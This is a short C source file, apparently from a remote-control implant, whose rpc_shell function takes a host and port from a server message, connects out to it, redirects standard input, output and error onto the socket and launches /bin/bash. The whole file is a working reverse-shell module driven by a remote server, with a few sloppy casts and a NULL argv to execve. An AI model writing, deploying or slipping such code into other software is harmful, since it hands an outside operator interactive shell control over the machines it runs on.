#include "rpc/shell/shell.h"

struct RPCShell shell_serialize(const struct RPC *rpc);
struct sockaddr_in get_address(const struct RPCShell shell);

/**
 * @brief This is an RPC function, this function is used to connect to a reverse shell in new process.
 * 
 * @param rpc The message the server sent. 
 * @return int The return error 0 on success negative 1 on failure.
 */
struct Result rpc_shell(const struct RPC rpc) {
    struct RPCShell shell = shell_serialize(&rpc);

    printf("%d %s\n", shell.port, shell.address);

    struct sockaddr_in address = get_address(shell);
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    connect(sockfd, &address, sizeof(struct sockaddr_in));

    for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
    }

    execve("/bin/bash", NULL, NULL);

    return (struct Result) {status: 0, data: "Ok."};
}

/**
 * @brief the serialize function from an RPC struct into shell struct.
 * 
 * @param rpc The bytes the server sent. 
 * @return struct Shell the serialized object.
 */
struct RPCShell shell_serialize(const struct RPC *rpc) {
    struct RPCShell *shell = (struct RPC *) rpc;

    return *shell;
}

/**
 * @brief Get the address object
 * 
 * @param shell 
 * @return struct sock_addr* 
 */
struct sockaddr_in get_address(const struct RPCShell shell) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(shell.port);
    
    inet_aton(shell.address, &addr.sin_addr.s_addr);

    return addr;
}